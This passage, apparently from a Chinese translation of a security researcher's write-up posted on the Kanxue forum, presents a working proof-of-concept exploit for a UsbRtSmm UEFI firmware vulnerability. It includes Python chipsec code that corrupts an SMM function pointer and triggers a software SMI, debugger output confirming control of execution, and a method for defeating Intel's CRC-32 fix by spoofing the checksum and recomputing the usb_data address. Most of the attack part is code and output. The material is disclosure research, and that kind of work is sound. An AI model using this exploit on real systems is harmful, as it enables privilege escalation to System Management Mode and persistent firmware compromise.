
```
from chipsec.hal.interrupts import Interrupts

PAGE_SIZE = 0x1000

SMI_USB_RUNTIME = 0x31

cs = chipsec.chipset.cs()

cs.init(None, True, True)

intr = Interrupts(cs)

SMRAM = cs.cpu.get_SMRAM()[0]

mem_read = cs.helper.read_physical_mem

mem_write = cs.helper.write_physical_mem

mem_alloc = cs.helper.alloc_physical_mem

# locate EFI_USB_PROTOCOL and usb_data in the memory

for addr in xrange(SMRAM / PAGE_SIZE - 1, 0, -1):

  if mem_read(addr * PAGE_SIZE, 4) == ‘USBP’:

    usb_protocol = addr * PAGE_SIZE

    usb_data = unpack(“<Q”, mem_read(addr * PAGE_SIZE + 8, 8))[0]

    break

assert usb_protocol != 0, “can’t find EFI_USB_PROTOCOL structure”

assert usb_data != 0, “usb_data pointer is empty”

# prepare our structure

struct_addr = mem_alloc(PAGE_SIZE, 0xffffffff)[1]

mem_write(struct_addr, PAGE_SIZE, ‘\x00’ * PAGE_SIZE) # clean the structure

mem_write(struct_addr + 0x0, 1, ‘\x2d’) # subfunction number

mem_write(struct_addr + 0xb, 1, ‘\x10’) # arithmetic adjustment

# store the pointer to the structure in the EBDA

ebda_addr = unpack(‘<H’, mem_read(0x40e, 2))[0] * 0x10

mem_write(ebda_addr + 0x104, 4, pack(‘<I’, struct_addr))

# replace the pointer in the usb_data

bad_ptr = 0xbaddad

func_offset = 0x78

mem_write(usb_data + func_offset, 8, pack(‘<Q’, bad_ptr))

# allow to read the pointer from EBDA

x = ord(mem_read(usb_data + 0x8, 1)) & ~0x10

mem_write(usb_data + 0x8, 1, chr(x))

# stuck it!

intr.send_SW_SMI(0, SMI_USB_RUNTIME, 0, 0, 0, 0, 0, 0, 0)
```

正如下面可以看到的那样，确实是在调用一个使系统卡住的错误地址。

```
>>> itp.cv.smmentrybreak=1

>>> itp.go()

>>? # running PoC on the target system...

>>? [SKL_C0_T0] SMM Entry break at 0xC600:0000000000008000 in task 0x0040

  [SKL_C0_T1] SMM Entry break at 0xC680:0000000000008000 in task 0x0040

  [SKL_C1_T0] SMM Entry break at 0xC700:0000000000008000 in task 0x0040

  [SKL_C1_T1] SMM Entry break at 0xC780:0000000000008000 in task 0x0040

>>?

>>> itp.cv.machinecheckbreak=1

>>> itp.go()

>>? [SKL_C0_T0] Machine Check break at 0x38:0000000000BADDAD in task 0x0040

  [SKL_C0_T1] Machine Check break at 0x38:00000000BD7DC834 in task 0x0040

  [SKL_C1_T0] Machine Check break at 0x38:00000000BD7DC834 in task 0x0040

  [SKL_C1_T1] Machine Check break at 0x38:00000000BD7DC834 in task 0x0040

>>?
```

机器检查异常发生时，第一个线程跳转到 `0xBADDAD` - 在概念验证中指定的地址。

## 影响和后果

尽管特定主板中的漏洞带来了一定的威胁，但不像不同厂商生产的不同主板一样，这种漏洞通常也不是那么重要。因此，有必要定义其他供应商是否在其硬件产品中使用相同的模块。没有必要检查其他固件来执行此操作：来自 `efi-whitelist` 存储库的数据就足够了。简单的列表搜索显示所有供应商都使用易受攻击的模块。此外，根据我们收集的数据，技嘉，华硕和戴尔也很脆弱。英特尔固件在这里最具有关联性，因为英特尔比其他设备更关心其设备的安全性。

我们已经做了一个特殊的展示台，并研究了基于Kaby Lake的英特尔NUC Kit NUC7i3BNH，看看英特尔的固件是否包含这个漏洞

![](https://bbs.kanxue.com/upload/attach/201712/K4QC646GJKHWUQG.jpg)

展示台

## 利用英特尔NUC套件

目前，最新的固件版本是0048。在提取 `UsbRtSmm` 模块后，我们可以分析 `DispatchFunction`。将模块与GA-Q170M-D3H中的模块进行比较，可以得出结论，开发路径几乎是相同的，但有一个例外：在 `DispatchFunction` 的开头有以下代码：

```
if ( byte_1B158 == 1 )

  return 0i64;

if ( sub_1A80C(usb_data) < 0 )

{

  byte_1B159 = 1;

  byte_1B158 = 1;

  return 0i64;

}
```

它看起来像是一种修复，但是我们不要让它们走开。首先，我们需要确定 `byte_1B158` 在什么情况下取值 1。排除 `sub_1A80C` 提供否定结果后 `byte_1B158` 等于 1 的情况，很显然 `sub_5EEC` 无条件地执行。`sub_5EEC` 的单个外部参照指向以下功能：

当调用一个未知的 `EFI_ACPI_EN_DISPATCH_PROTOCOL` 方法时，该函数作为参数发送，这似乎是一个回调。换句话说，如果发生某个事件，则会调用 `sub_EEC` 函数。但是这个事件是什么？搜索GUID `{bd88ec68-ebe4-4f7b-935a-4f666642e75f}` 显示协议在 `AcpiModeEnable` 模块中实现。这个名字是不言而喻的，不是吗？没有必要去研究它 - 很明显，当系统跳入ACPI模式时，调用 `sub_5EEC`。

不幸的是，在这种情况下，利用Windows 10系统中的漏洞将更加困难，因为从Vista开始，Windows操作系统驱动程序只能在ACPI模式下工作。Linux，我们求求你，来救我们！使用Ubuntu 16.10 AMD64，我们可以在非ACPI模式下加载系统。为此，我们将 `acpi = off` 添加到 `GRUB_CMDLINE_LINUX_DEFAULT` 参数。之后，系统将在没有ACPI支持的情况下加载。

剩下的唯一的事情就是学习 `sub_1A80C` 函数检查什么。在研究这个函数的时候，肯定会验证 `usb_data` 结构。检查算法是相当大的，但我们唯一感兴趣的检查是 `usb_data + 0x78` 地址检查，这可以在包含以下代码段的 `sub_1A2D0` 函数中看到：

```
int __fastcall sub_5F1C(EFI_GUID *Protocol, void *Interface, EFI_HANDLE Handle)

{

  signed __int64 v3; // rax@1

  char v5; // [sp+20h] [bp-18h]@2

  void *acpi_en_dispatch; // [sp+58h] [bp+20h]@1

  v3 = Smst->SmmLocateProtocol(&EFI_ACPI_EN_DISPATCH_PROTOCOL_GUID, 0i64, &acpi_en_dispatch);

  if ( v3 >= 0 )

    LODWORD(v3) = (*acpi_en_dispatch)(acpi_en_dispatch, sub_5EEC, &v5);

  return v3;
```

我们需要的指针被复制到内部缓冲区。之后，我们可以在函数的最后看到下面的代码：

```
calculate_crc32(&buffer, 0x7A0ui64, &crc_array[2]);

calculate_crc32(crc_array, 0xCui64, crc_out);
```

找到GA-Q170M-D3H中利用的漏洞修复。当系统加载时，正在计算和保存 `usb_data` 结构存储区的一部分的CRC-32散列。当SW SMI被调用时，散列被重新计算。如果结果不匹配，则停止执行，并且将禁止进一步尝试执行处理程序代码。

也许，这个修复方式确实可以防止漏洞利用，但是有一点“but”：验证算法在很大程度上依赖于CRC-32算法的加密强度接近零。为了欺骗CRC-32哈希，只需使用Project Nayuki的python脚本，我们可以简单地改正我们感兴趣的数据之后的4个连续字节。唯一需要的是使其功能适应缓冲区而不是文件。

考虑到CRC-32散列保存，我们可以像这样修改指针：

```
bad_ptr = 0xbaddad

buf_size = 0x10

buffer = mem_read(usb_data + 0x70, buf_size)

crc32 = get_buffer_crc32(buffer)

# replace the pointer (usb_data + 0x78)

buffer = buffer[0:8] + pack(‘<Q’, bad_ptr)

# spoofing crc32, first 4 bytes will be modified

buffer = modify_buffer_crc32(buffer, 0, crc32)

mem_write(usb_data + 0x70, buf_size, buffer)
```

但是，与GA-Q170M-D3H相反，使用Intel NUC7i3BNH时会出现错误：

```
AssertionError: usb_data pointer is empty
```

如果我们返回到 `Uhcd` 模块（这次是NUC7i3BNH固件），我们可以看到其中一个功能是这样的：

```
EFI_STATUS __fastcall sub_2CB0(void *a1)

{

  *(_QWORD *)(usb_protocol + 8) = 0i64;

  return gEfiBootServices_0->CloseEvent(a1);

}
```

它看起来像是一种缓存。现在，`usb_data` 结构地址应该以另一种方式定义。回到 `usb_data` 和 `usb_protocol` 结构分配发生的地方，很清楚的是在这两种情况下调用了 `sub_64D4` 函数。该函数将内存分配大小和地址对齐作为参数。回顾一下函数，我们发现当第一次调用函数时，通过 `EFI_BOOT_SERVICES.AllocatePages` 发生一次内存分配。而且，总共同时分配了 `0x11` 页的内存。进一步的调用将这个分配分成几块，根据对齐。结合内存分配，这种行为提供了根据 `usb_protocol` 的地址来定位 `usb_data` 结构地址的机会。首先分配的是 `usb_data`（`0x7AC8` 字节）。之后，分配需要 `0x1000` 字节对齐的 `0x8000` 字节的未知存储空间。最后，`usb_protocol` 获取其分配的内存（`0x90` 字节，对齐为 `0x10`）。因此，可以从 `usb_protocol` 地址中减去 `0x10000` 来学习 `usb_data` 地址结构。这是我们的概念证明的最后一招。

```
assert usb_protocol != 0, “can’t find EFI_USB_PROTOCOL structure”

if usb_data == 0:
  usb_data = usb_protocol - 0x10000
```

请参阅完整的概念证明：

UsbRt SMM提权

## 结论

我们已经设法检测到一个高度严重的漏洞，并允许权限提升到系统管理模式。这个漏洞在很多平台上都很常见，因为它是包含它的 `UsbRtSmm` 模块。尽管有一些例外，即使最新的英特尔器件也容易受到这种威胁。此外，我们描述了绕过由CRC-32哈希和伪随机授予的“robust protection”的过程。由于英特尔发布固件更新，指定其更新日志中的安全修复程序，因此可以使用其他供应商固件中的固件模块进行二进制比较。

原文[UEFI BIOS holes. So Much Magic. Don’t Come Inside](https://bbs.kanxue.com/elink@ee4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6W2L8h3u0W2k6r3W2Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8r3!0Y4i4K6u0r3N6h3g2X3K9g2)9J5k6r3u0A6L8%4y4Q4x3X3c8Z5L8$3I4W2M7#2)9J5k6s2y4G2i4K6u0V1L8i4g2U0K9q4)9J5k6r3#2S2k6$3W2U0i4K6u0V1k6r3!0F1N6q4)9J5k6r3y4G2L8h3g2Q4x3X3c8A6L8Y4y4A6k6r3g2Q4x3V1k6Q4x3@1k6X3M7X3!0E0i4K6y4p5M7$3W2F1k6$3I4W2L8h3g2K6M7$3q4Y4k6g2)9J5y4X3q4E0M7q4)9K6b7X3W2K6j5i4m8H3K9h3&6K6N6r3q4D9L8r3g2V1i4K6y4p5x3l9`.`.).

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
